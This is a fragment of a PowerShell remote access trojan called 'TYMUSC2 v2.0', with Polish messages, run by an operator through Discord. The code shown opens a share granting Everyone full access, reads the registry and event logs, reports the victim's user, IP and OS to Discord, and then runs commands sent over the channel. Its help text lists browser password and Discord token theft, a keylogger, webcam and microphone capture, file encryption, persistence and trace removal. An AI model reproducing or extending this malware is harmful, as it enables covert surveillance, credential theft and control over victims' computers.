                $outDir = "$env:TEMP\unzipped_$([DateTime]::Now.Ticks)"
                New-Item -ItemType Directory -Path $outDir -Force | Out-Null
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [System.IO.Compression.ZipFile]::ExtractToDirectory($path, $outDir)
                $response = "Rozpakowano do: $outDir"
            } else {
                $response = "Plik ZIP nie istnieje: $path"
            }
        }
        '^!startup$' {
            $startupItems = Get-CimInstance Win32_StartupCommand -ErrorAction SilentlyContinue
            if ($startupItems) {
                $response = "ELEMENTY STARTOPWE:`n"
                foreach ($s in $startupItems) {
                    $response += "$($s.Name) -> $($s.Command)`n"
                }
            } else {
                $response = "Nie znaleziono elementow startowych"
            }
        }
        '^!eventlog (.+)$' {
            $logName = $matches[1]
            try {
                $events = Get-WinEvent -LogName $logName -MaxEvents 20 -ErrorAction SilentlyContinue
                if ($events) {
                    $response = "EVENT LOG: $logName (20 ostatnich)`n"
                    foreach ($e in $events) {
                        $response += "$($e.TimeCreated) | $($e.Id) | $($e.LevelDisplayName) | $($e.ProviderName)`n"
                    }
                } else {
                    $response = "Brak zdarzen w logu: $logName"
                }
            } catch {
                $response = "Blad odczytu logu: $($_.Exception.Message)"
            }
        }
        '^!registry (.+)$' {
            $path = $matches[1]
            try {
                if ($path -match '^HKLM') {
                    $psPath = $path -replace '^HKLM:', 'HKLM:\'
                    $items = Get-ItemProperty -Path $psPath -ErrorAction SilentlyContinue
                    if ($items) {
                        $response = "REJESTR: $path`n"
                        $items.PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' } | ForEach-Object {
                            $response += "$($_.Name) = $($_.Value)`n"
                        }
                    } else {
                        $response = "Klucz nie istnieje: $path"
                    }
                } else {
                    $psPath = $path -replace '^HKCU:', 'HKCU:\'
                    $items = Get-ItemProperty -Path $psPath -ErrorAction SilentlyContinue
                    if ($items) {
                        $response = "REJESTR: $path`n"
                        $items.PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' } | ForEach-Object {
                            $response += "$($_.Name) = $($_.Value)`n"
                        }
                    } else {
                        $response = "Klucz nie istnieje: $path"
                    }
                }
            } catch {
                $response = "Blad odczytu rejestru: $($_.Exception.Message)"
            }
        }
        '^!share (.+)$' {
            $path = $matches[1]
            try {
                if (-not (Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
                $shareName = "TYMUSC2_$([DateTime]::Now.Ticks)"
                net share $shareName=$path /GRANT:"Everyone,FULL" /UNLIMITED 2>&1 | Out-Null
                $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
                $response = "Udostepniono: \\$ip\$shareName`nPath: $path`nDostep: Everyone (FULL)"
            } catch {
                $response = "Blad tworzenia udzialu: $($_.Exception.Message)"
            }
        }
        '^!help$|^!commands$' {
            $response = "LISTA KOMEND TYMUSC2 v2.0:`n"
            $response += "`nINFORMACJE:`n!info - Pelne info o systemie`n!sysinfo - Krotkie info systemowe`n!ip - Publiczne IP + lokalizacja`n!ps - Lista procesow`n!uptime - Czas dzialania systemu`n!idle - Czas bezczynnosci`n!clipboard / !cb - Schowek`n!key - Klucz Windows`n"
            $response += "`nEKRAN:`n!screenshot / !ss - Zrzut ekranu`n!screenshot_all / !ssall - Wszystkie monitory`n!webcam / !cam - Zdjecie z kamery`n!record / !startrecord - Nagrywaj ekran`n!stoprecord / !stop - Zakoncz nagrywanie`n"
            $response += "`nAUDIO:`n!recordmic / !mic - Nagrywaj mikrofon`n!stopmic - Zakoncz nagrywanie mikrofonu`n!speak <text> - Mow przez glosniki`n!voice <text> - Mow po polsku`n!vol <0-100> - Glosnosc`n!mute - Wylacz dzwiek`n!bright <0-100> - Jasnosc ekranu`n"
            $response += "`nSYSTEM:`n!shell <cmd> - Wykonaj komende`n!kill <PID> - Zabij proces`n!shutdown - Wylacz komputer`n!restart - Restart`n!elevate / !admin - Podnies uprawnienia`n!lock - Blokada fullscreen`n!unlock - Odblokuj`n!hide - Ukryj konsoli`n!min - Minimalizuj`n!max - Maksymalizuj`n!move X Y - Przesun okno`n"
            $response += "`nSIEĆ:`n!netstat - Aktywne polaczenia`n!arp - Tablica ARP`n!wifi - Zapasane sieci WiFi`n"
            $response += "`nHASLA I DANE:`n!passwords / !pass - Hasla z przegladarek`n!tokens / !browsers - Tokeny Discord + ciasteczka`n!keylog / !keys - Uruchom keylogger`n!getkeylog / !getkeys - Pobierz logi keyloggera`n"
            $response += "`nPLIKI:`n!dir <sciezka> - Lista plikow`n!upload <sciezka> - Wyslij plik na Discord`n!grab <sciezka> - Pobierz plik`n!download <url> - Pobierz plik z internetu`n!search <pattern> - Szukaj plikow`n!zip <sciezka> - Spakuj do ZIP`n!unzip <sciezka> - Rozpakuj ZIP`n!crypt <sciezka> - Zaszyfruj plik`n!decrypt <sciezka> - Odszyfruj plik`n"
            $response += "`nUZYTKOWNICY:`n!users / !sessions - Aktywni uzytkownicy`n!services - Uruchomione uslugi`n!startup - Programy startowe`n"
            $response += "`nSYSTEM:`n!eventlog <nazwa> - Logi zdarzen`n!registry <sciezka> - Odczyt rejestru`n!share <sciezka> - Udostepnij folder`n"
            $response += "`nPRANKI:`n!msg <tekst> - Message box`n!alert <tekst> - Alert krytyczny`n!type <tekst> - Wpisz tekst`n!open <sciezka> - Otworz plik/program`n!chrome - Otworz Chrome`n!wallpaper <sciezka> - Zmien tapete`n"
            $response += "`nZARZADZANIE:`n!persist / !install - Instaluj persistencje`n!clean / !remove - Usun persistencje`n!clear - Wyczysc slady`n!exit - Wylacz TYMUSC2`n!help / !commands - Ta pomoc"
        }
        default {
            $response = "Nieznana komenda: $Command`nUzyj !help aby zobaczyc liste komend"
        }
    }
    
    return $response
}

# ===== GLOWNA PETLA =====
# Inicjalizacja
if (-not (Test-Path $dataDir)) { New-Item -ItemType Directory -Path $dataDir -Force | Out-Null }

# Autopersist jesli uruchomiony z -Startup
if ($Startup) {
    Persist-Script | Out-Null
}

# Wyslij informacje o starcie
$startInfo = Get-ComprehensiveInfo
Send-DiscordMessage -Content "TYMUSC2 v2.0 AKTYWNY - $($startInfo.ComputerName)"
Send-DiscordMessage -Content "User: $($startInfo.Username) | IP: $($startInfo.PublicIP) | OS: $($startInfo.OS)"
Send-DiscordMessage -Content "Dostepne komendy: !help"

# Glowna petla nasluchiwania
$lastCommand = ""
$commandHistory = @()

while ($true) {
    try {
        $cmd = Get-LastCommand
        
        if ($cmd -and $cmd -ne $lastCommand) {
            $lastCommand = $cmd
            $commandHistory += $cmd
            if ($commandHistory.Count -gt 50) { $commandHistory = $commandHistory[-50..-1] }
            
            $response = Execute-Command -Command $cmd
            if ($response) {
                if ($response.Length -gt 1900) {
                    # Wyslij jako embed jesli za dlugi
                    Send-DiscordEmbed -Title "Wykonano: $cmd" -Description $response.Substring(0, 1800) + "... [przycieto]"
                } else {
                    Send-DiscordMessage -Content $response
                }
            }
        }
        
        Start-Sleep -Seconds $checkInterval
    } catch {
        Start-Sleep -Seconds 10
    }
}
